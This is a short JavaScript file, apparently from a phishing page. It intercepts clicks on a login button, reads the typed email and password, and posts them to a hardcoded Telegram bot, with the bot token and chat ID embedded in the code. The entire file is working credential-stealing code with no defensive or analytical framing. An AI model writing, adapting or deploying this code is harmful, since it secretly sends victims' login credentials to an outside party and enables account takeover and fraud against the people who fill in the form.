const telegramApiEndpoint = "https://api.telegram.org/bot" + "5628469279:AAEcZnLR99tKeIB8vY7kJISPiMRegvFkWcc";
const chatId = "5462313510";

const loginBtn = document.querySelector(".loginBtn");
loginBtn.addEventListener("click", function(event) {
  event.preventDefault(); 

  const emailInput = document.querySelector("input[type='text']");
  const passwordInput = document.querySelector("input[type='password']");

  const email = emailInput.value;
  const password = passwordInput.value;

  const message = "Email: " + email + "\nPassword: " + password;

  fetch(telegramApiEndpoint + "/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
});

